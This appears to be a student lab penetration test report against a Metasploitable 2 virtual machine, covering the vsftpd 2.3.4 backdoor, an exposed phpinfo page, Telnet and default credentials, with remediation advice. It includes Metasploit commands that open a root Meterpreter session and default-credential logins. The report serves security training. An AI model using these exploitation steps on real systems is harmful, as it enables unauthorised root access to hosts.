@@ -1,0 +1,349 @@
+<h1 id="vulnerability-assessment-penetration-test-report">Vulnerability
+Assessment &amp; Penetration Test Report</h1>
+<p><strong>Prepared by:</strong> Aazib Ali <strong>Course:</strong>
+Digital Forensics &amp; Cyber Security Bootcamp, Atomcamp
+<strong>Trainer:</strong> Waseem Abbas Khan <strong>Date of
+Assessment:</strong> 7 November 2026 <strong>Classification:</strong>
+Student Lab Exercise — Not for Distribution</p>
+<hr />
+<p><strong>Target environment:</strong></p>
+<table>
+<colgroup>
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+</colgroup>
+<thead>
+<tr>
+<th>Role</th>
+<th>OS</th>
+<th>IP Address</th>
+<th>Network</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Attacker</td>
+<td>Kali Linux</td>
+<td>192.168.88.133</td>
+<td>NAT</td>
+</tr>
+<tr>
+<td>Target</td>
+<td>Metasploitable 2 (Ubuntu-based Linux)</td>
+<td>192.168.88.134</td>
+<td>NAT</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Engagement type:</strong> Grey-box <strong>Simulation
+type:</strong> Reconnaissance, exploitation and post-exploitation</p>
+<hr />
+<h2 id="executive-summary">1. Executive Summary</h2>
+<p>This assessment was conducted against a single Linux host
+(Metasploitable 2) in an isolated NAT laboratory environment. The
+engagement covered network discovery, port scanning, automated
+vulnerability scanning (GVM/OpenVAS), manual CVE research, and
+controlled exploitation using the Metasploit Framework.</p>
+<p><strong>Findings summary:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Severity</th>
+<th>Count</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Critical</td>
+<td>1</td>
+</tr>
+<tr>
+<td>High</td>
+<td>2</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>1</td>
+</tr>
+<tr>
+<td><strong>Total</strong></td>
+<td><strong>4</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Highest severity:</strong> Critical (CVSS 9.8)</p>
+<p><strong>Primary impact:</strong> An unauthenticated attacker with
+network access to port 21 can gain complete root-level control of the
+target host — full read and write access to all data, including database
+services running on the same machine — without any credentials and
+without any action from a legitimate user. A second finding confirms
+that default credentials are valid on two separate services, meaning the
+same access is achievable even without the backdoor.</p>
+<p><strong>Engagement type:</strong> Grey-box — the target IP address
+was known in advance; no source code or credentials were provided at the
+start.</p>
+<hr />
+<h2 id="engagement-scope-and-details">2. Engagement Scope and
+Details</h2>
+<p><strong>Scope type:</strong> Grey-box <strong>Target IP:</strong>
+192.168.88.134 (Metasploitable 2) <strong>Testing window:</strong> 7
+November 2026 <strong>Network:</strong> Isolated NAT — target not
+reachable from any external network</p>
+<p><strong>Methodology (in order performed):</strong></p>
+<ol type="1">
+<li>Network discovery (nmap -sn, netdiscover)</li>
+<li>Port scanning (nmap default, full-range, targeted)</li>
+<li>Version and OS detection (nmap -sV, -O)</li>
+<li>NSE script enumeration (ftp, http, smb scripts)</li>
+<li>Manual CVE research (NVD, Debian tracker, CWE)</li>
+<li>Automated vulnerability scanning (Greenbone/OpenVAS GVM)</li>
+<li>Exploitation (Metasploit Framework)</li>
+<li>Post-exploitation confirmation (Meterpreter + shell access)</li>
+</ol>
+<p><strong>Exclusions:</strong> - No denial-of-service techniques were
+used - No data was exfiltrated from the target - No persistence
+mechanisms were installed - All activity was limited to the lab target
+IP only</p>
+<p><strong>Legal context:</strong> All techniques were performed
+exclusively against a lab-owned virtual machine with no external network
+connectivity. No activity was directed at any system outside the
+authorised lab scope. Exploitation against any system without written
+authorisation is a criminal offence under Pakistan’s Prevention of
+Electronic Crimes Act 2016 and in every comparable jurisdiction.</p>
+<hr />
+<h2 id="findings-and-proofs-of-concept">3. Findings and Proofs of
+Concept</h2>
+<hr />
+<h3
+id="finding-1-ftp-backdoor-command-execution-in-vsftpd-2.3.4">Finding 1:
+FTP Backdoor Command Execution in vsftpd 2.3.4</h3>
+<p><strong>Severity:</strong> CRITICAL — CVSS 9.8
+<strong>Vector:</strong> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+<strong>Affected asset:</strong> 192.168.88.134:21/tcp — vsftpd 2.3.4
+<strong>Identifiers:</strong> CVE-2011-2523 | CWE-78 (OS Command
+Injection) | cpe:/a:vsftpd:vsftpd:2.3.4</p>
+<p><strong>Description:</strong> The FTP server on port 21 was running
+vsftpd 2.3.4. This version contains a backdoor introduced through a
+supply-chain compromise: between 30 June and 3 July 2011, the official
+download server served a tampered archive. When a specific character
+sequence is supplied as the FTP username, the backdoor triggers and
+opens a command shell on port 6200/tcp with no authentication
+required.</p>
+<p><strong>Proof of concept:</strong></p>
+<p>Step 1 — Discovery (nmap version detection):</p>
+<p>nmap -sV -p21 192.168.88.134 Result: 21/tcp open ftp vsftpd 2.3.4</p>
+<p>Explanation: Version detection identified the exact vulnerable build.
+<img src="screenshots/a1-nmap-sv.png" alt="version scan" /></p>
+<p>Step 2 — Validation (NSE script):</p>
+<p>nmap -p21 –script ftp-vsftpd-backdoor.nse 192.168.88.134 Result:
+VULNERABLE — uid=0(root) gid=0(root)</p>
+<p>Explanation: The NSE script triggered the backdoor and confirmed
+root-level code execution. <img src="screenshots/a3-backdoor-script.png"
+alt="backdoor script" /></p>
+<p>Step 3 — Exploitation (Metasploit):</p>
+<p>msfconsole -q use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS
+192.168.88.134 set LHOST 192.168.88.133 exploit</p>
+<p>Result: [+] Backdoor has been spawned! [*] Meterpreter session 1
+opened (192.168.88.133:4444 -&gt; 192.168.88.134:39725)</p>
+<p>meterpreter &gt; getuid Server username: root</p>
+<p>meterpreter &gt; shell whoami → root id → uid=0(root) gid=0(root)</p>
+<p>Explanation: Metasploit triggered the backdoor and established a
+Meterpreter session. Both getuid and shell-level id confirm full
+root-level access with no credentials used at any point. <img
+src="screenshots/a13-meterpreter-session.png"
+alt="meterpreter session" /> <img
+src="screenshots/a14-confirm-access.png" alt="confirm access" /></p>
+<p><strong>Impact:</strong> Any party able to reach port 21 can obtain
+unauthenticated remote code execution as root. The same host also runs
+MySQL (3306) and PostgreSQL (5432), so a compromise also exposes any
+data held in those services.</p>
+<p><strong>Remediation:</strong> 1. Upgrade vsftpd to a current, stable
+release. 2. Verify vendor package signatures before deployment. 3. If
+FTP is not required, disable the service entirely. 4. Restrict port 21
+to named source addresses if FTP is business-critical.</p>
+<p><strong>References:</strong> -
+https://nvd.nist.gov/vuln/detail/CVE-2011-2523 -
+https://security-tracker.debian.org/tracker/CVE-2011-2523 -
+https://www.exploit-db.com/exploits/49757</p>
+<hr />
+<h3 id="finding-2-exposed-phpinfo.php-information-disclosure">Finding 2:
+Exposed phpinfo.php — Information Disclosure</h3>
+<p><strong>Severity:</strong> MEDIUM — CVSS 5.3 (approx)
+<strong>Vector:</strong> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+<strong>Affected asset:</strong> 192.168.88.134:80/tcp — Apache httpd,
+PHP 5.2.4-2ubuntu5.10 <strong>Identifiers:</strong> CWE-200 (Exposure of
+Sensitive Information)</p>
+<p><strong>Description:</strong> The file /phpinfo.php is publicly
+accessible with no authentication. It exposes the complete server
+configuration including PHP version, OS version, internal file paths,
+and loaded modules — all without any login required.</p>
+<p><strong>Proof of concept:</strong></p>
+<p>Step 1 — Detection (NSE script):</p>
+<p>nmap -p80 –script http-enum.nse 192.168.88.134 Result: /phpinfo.php:
+PHP info page detected</p>
+<figure>
+<img src="screenshots/a6-http-enum.png" alt="http enum" />
+<figcaption aria-hidden="true">http enum</figcaption>
+</figure>
+<p>Step 2 — Confirmation (curl):</p>
+<p>curl -s http://192.168.88.134/phpinfo.php | head -40 Result: PHP
+Version 5.2.4-2ubuntu5.10, System: Linux metasploitable
+2.6.24-16-server, Config path: /etc/php5/cgi/php.ini</p>
+<figure>
+<img src="screenshots/a7-phpinfo-page.png" alt="phpinfo page" />
+<figcaption aria-hidden="true">phpinfo page</figcaption>
+</figure>
+<p>Explanation: The file returned complete internal server configuration
+with no login or credential required at any point.</p>
+<p><strong>Impact:</strong> An attacker learns the exact software
+versions and server layout without performing any exploitation, reducing
+the effort required to select a targeted exploit.</p>
+<p><strong>Remediation:</strong> Remove phpinfo.php from the production
+server. Debugging files must never be deployed to live environments.</p>
+<p><strong>References:</strong> -
+https://cwe.mitre.org/data/definitions/200.html</p>
+<hr />
+<h3 id="finding-3-telnet-cleartext-authentication-protocol">Finding 3:
+Telnet — Cleartext Authentication Protocol</h3>
+<p><strong>Severity:</strong> HIGH — CVSS 7.5 (approx)
+<strong>Vector:</strong> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+<strong>Affected asset:</strong> 192.168.88.134:23/tcp — Linux telnetd
+<strong>Identifiers:</strong> CWE-319 (Cleartext Transmission of
+Sensitive Information)</p>
+<p><strong>Description:</strong> The target is running Telnet on port
+23. Telnet transmits all data including usernames and passwords in plain
+text with no encryption. This is a design-level weakness, not a CVE: the
+protocol was built before encryption was a standard requirement.</p>
+<p><strong>Proof of concept:</strong></p>
+<p>Step 1 — Detection:</p>
+<p>nmap -sV -p23 192.168.88.134 Result: 23/tcp open telnet Linux
+telnetd</p>
+<figure>
+<img src="screenshots/a8-telnet-sv.png" alt="telnet scan" />
+<figcaption aria-hidden="true">telnet scan</figcaption>
+</figure>
+<p>Step 2 — Connection confirmed:</p>
+<p>telnet 192.168.88.134 23 Login: msfadmin / Password: msfadmin Result:
+successful login — system banner displayed</p>
+<p>The system itself warned: “Never expose this VM to an untrusted
+network!” <img src="screenshots/a9-telnet-login.png"
+alt="telnet login" /></p>
+<p>Explanation: The login succeeded with no encryption at any point. Any
+attacker on the same network segment capturing this traffic would see
+the username and password in plain text.</p>
+<p><strong>Impact:</strong> An attacker on the same network segment can
+capture a Telnet session and read credentials directly from the
+packets.</p>
+<p><strong>Remediation:</strong> Disable Telnet and replace with SSH. If
+Telnet must remain for a legacy reason, restrict it strictly to a
+trusted internal network behind a VPN.</p>
+<p><strong>References:</strong> -
+https://cwe.mitre.org/data/definitions/319.html</p>
+<hr />
+<h3 id="finding-4-weak-default-credentials-on-multiple-services">Finding
+4: Weak Default Credentials on Multiple Services</h3>
+<p><strong>Severity:</strong> HIGH — CVSS 8.1 <strong>Vector:</strong>
+CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H <strong>Affected
+assets:</strong> FTP (21/tcp), SSH (22/tcp) — 192.168.88.134
+<strong>Identifiers:</strong> CWE-1392 (Use of Default Credentials)</p>
+<p><strong>Description:</strong> Two service accounts were found using
+default, publicly documented credentials: user:user and
+msfadmin:msfadmin. These are published in the product documentation and
+are the first pair any attacker would try. No software vulnerability is
+required.</p>
+<p><strong>Proof of concept:</strong></p>
+<p>Step 1 — FTP login with default credentials:</p>
+<p>ftp 192.168.88.134 Name: user Password: user Result: 230 Login
+successful.</p>
+<figure>
+<img src="screenshots/a10-ftp-weak-login.png" alt="ftp weak login" />
+<figcaption aria-hidden="true">ftp weak login</figcaption>
+</figure>
+<p>Step 2 — SSH login with default credentials:</p>
+<p>ssh -o HostKeyAlgorithms=+ssh-rsa -o
+PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.88.134 Password:
+msfadmin Result: successful authentication</p>
+<p>Note: a legacy host key algorithm flag was required, confirming the
+SSH service itself is also outdated — an additional configuration
+weakness. <img src="screenshots/a11-ssh-weak-login.png"
+alt="ssh weak login" /></p>
+<p>Explanation: Both services granted interactive access using
+credentials that are a matter of public record, with no further
+verification.</p>
+<p><strong>Impact:</strong> Authenticated access to the host is possible
+without exploiting any software vulnerability. Once authenticated,
+further privilege escalation via sudo is likely, and the same
+credentials may be valid across other services on the same network.</p>
+<p><strong>Remediation:</strong> 1. Change all default credentials
+before any system is network-reachable. 2. Enforce minimum password
+length of 10+ characters with complexity. 3. Deploy a banned-password
+list covering rockyou.txt entries. 4. Disable accounts that are not
+required. 5. Enable MFA on all remotely reachable administrative
+interfaces.</p>
+<p><strong>References:</strong> -
+https://cwe.mitre.org/data/definitions/1392.html</p>
+<hr />
+<h2 id="remediation-summary-prioritised">4. Remediation Summary
+(Prioritised)</h2>
+<table>
+<colgroup>
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+</colgroup>
+<thead>
+<tr>
+<th>Priority</th>
+<th>Finding</th>
+<th>Severity</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1 — Immediate</td>
+<td>vsftpd 2.3.4 backdoor</td>
+<td>Critical</td>
+<td>Upgrade vsftpd; verify package signatures</td>
+</tr>
+<tr>
+<td>2 — Immediate</td>
+<td>Weak default credentials</td>
+<td>High</td>
+<td>Change all default passwords before network exposure</td>
+</tr>
+<tr>
+<td>3 — High</td>
+<td>Telnet cleartext</td>
+<td>High</td>
+<td>Disable Telnet; replace with SSH</td>
+</tr>
+<tr>
+<td>4 — Medium</td>
+<td>Exposed phpinfo.php</td>
+<td>Medium</td>
+<td>Remove debugging files from production</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="references">5. References</h2>
+<ul>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2011-2523</li>
+<li>https://security-tracker.debian.org/tracker/CVE-2011-2523</li>
+<li>https://www.exploit-db.com/exploits/49757</li>
+<li>https://cwe.mitre.org/data/definitions/78.html</li>
+<li>https://cwe.mitre.org/data/definitions/200.html</li>
+<li>https://cwe.mitre.org/data/definitions/319.html</li>
+<li>https://cwe.mitre.org/data/definitions/1392.html</li>
+</ul>
+<hr />
+<h2 id="appendix-raw-evidence">Appendix: Raw Evidence</h2>
+<p>Raw nmap scan outputs: - scan-default.txt - scan-versions.txt -
+scan-backdoor-check.txt - scan-http-enum.txt - scan-telnet.txt</p>
+<p>Screenshots are in the screenshots/ folder. All exploitation steps
+are documented in exploitation-writeup.md. GVM comparison is documented
+in gvm-comparison.md.</p>
